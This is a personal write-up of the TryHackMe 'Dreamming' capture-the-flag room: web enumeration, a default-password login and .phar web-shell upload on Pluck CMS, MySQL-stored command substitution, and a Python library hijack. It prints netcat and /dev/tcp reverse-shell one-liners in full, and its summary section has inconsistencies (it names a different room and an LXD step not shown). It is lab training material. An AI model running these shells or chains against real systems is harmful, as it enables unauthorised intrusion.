# TryHackMe - Dreamming Room Writeup

## Overview

This is a detailed walkthrough of how I rooted the **Dreamming** room on TryHackMe and captured both user and root flags. The room involved `web application enumeration`, `Lateral Movement` and `command substitution ( MySQL injection)`.

---

## Recon :

I started the engagement with an `nmap` scan:

```bash
nmap -sC -sV -oN initial_scan.txt <target-ip>
```

The scan revealed two open ports:

- **22** (SSH)
- **80** (HTTP)

---

## Enumeration: Web Application Discovery

Accessing port 80 initially led nowhere. just the default apach2 page, nothing special there, so the only thing left is file & directory fuzzing, let's do that  

```bash
gobuster dir -u http://10.49.188.89 -w /usr/share/seclists/Discovery/Web-Content/common.txt
```

 we got a hit with **/app**, let' see what's there.
 okey, so from what we clicked we know that this site runs `pluck 4.7.13` which is a content management system (CMS), we see in the bottom `admin`, and when clicking that we get a login page.
 
since we have no other choice, let's try some common passwords, and shortly after we get the right one which is `password`

now i was in the administration dashboard, after searching i came to findout that this CMS version has vulnerabilities, and i found one, it's vulnerable to `File Upload Remote Code Execution` and i see the exploit from ExploitDB.

after checking that python exploit, we find that it's uploading a `.phar` file (which is one of many other php extensions) that contains a web shell, since we know the way let's do that manually.

---

## Exploitation :
**http://<target-ip>/app/pluck-4.7.13/admin.php?action=files**
here in this url i uploaded php reverse shell `reverse_shell.phar` and started the listener after files gets called i got the reverse connection.


---

## Lateral Movement :

**lucien**

```bash
cat /etc/passwd |grep 'bash'
```
after some enumeration, i find interesting 3users and the file `/opt` :

```bash
cat test.py
```
checking those files i find a password in `test.py` of user lucien. 

**death**

```bash
sudo -l
```
again enumerating to for user death, i see that we i can run `/usr/bin/python3 /home/death/getDreams.py` as the user.

```bash
cat /home/death/getDreams.py
```
then i remembered seeing this file name before, that was in the `/opt` directory, reading that file (assuming this script is a copy of that one in death's home directory) this script connects to the mysql database, specifically to the `library` DB, then selects the columns `dreamer`, `dream` from the `dreams table`, and prints them using echo.

i then thought if i can control the value of one of those two variables, i can get command execution using `command substitution`, which is a mechanism that allows the output of a command or commands to replace the command itself. When a command is enclosed within `$()`, Bash executes the command and substitutes its standard output in place.

I did however, run `ls -lah` and found a `.bash_history` as well as a `.mysql_history` file which showed me Lucien’s MySQL password. 

```mysql
insert into dreams (dreamer, dream) values (‘whoami | bash’, ‘-l’);
```

```bash
sudo -u death /usr/bin/python3 /home/death/getDreams.py
```
i see that the test payload command was executed, that's the same concept i want to apply to get command execution as death.

now let's add another dream (nightmare) in the table in form of `$(reverse shell)` :

```bash
nc -lvnp 4444
```

```mysql
mysql> INSERT INTO dreams (dreamer, dream) VALUES ('Nightmare', '$(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <target-ip> 4444 >/tmp/f)');
```

```bash
sudo -u death /usr/bin/python3 /home/death/getDreams.py
```
and i got a shell as `death`, one user left, `morpheus`.

**morpheus**

```bash
find / -type f -not -path "/proc/*" -not -path "/sys/*" -not -path "/home/death/*" -writable 2>/dev/null
```
interesting, i can write to 2 python libraries which are : `shutil` & `fnmatch`, that's good but didn't find how to abuse that yet, so kept enumerating.

i decided to run `pspy64` to check the live running processes, and one process caught my attention :
CMD: UID=1002  PID=5981   | /usr/bin/python3.8 /home/morpheus/restore.py

```bash
cat /home/morpheus/restore.py
```
this python script uses the `shutil` library, and i remember can write to this library, so i added some malicious python code to that library, and once the script gets executed and imports this library, it will execute the my python reverse-shell code and i overwrite the library to a python reverse shell.

```bash
nc -lvnp 4444
```

```bash
echo "import os;os.system(\"bash -c 'bash -i >& /dev/tcp/<target-ip>/4444 0>&1'\")" > /usr/lib/python3.8/shutil.py
```
after waiting for a while, i got the reverse-connection and got the 3rd flag too.

---

## Flow

	The Lookup room involved a mix of:

	Nmap → /app directory → Pluck CMS 4.7.13
	  ↓
	Upload .phar webshell (CVE-2020-29607) with password "password"
	  ↓
	Reverse shell as www-data
	  ↓
	Find credentials → switch to lucien
	  ↓
	sudo -u death /usr/local/bin/getDreams.py + MySQL injection
	  ↓
	Shell as death (or catch reverse shell)
	  ↓
	LXD privesc OR writable Python lib hijack → root as morpheus
	Each step built on the last, and it was a great exercise in real-world exploitation chains.

---
🖼️ **Find all screenshots here:** [`screenshots/dreamming/`](../screenshots/dreamming/)

*Thanks for reading!*
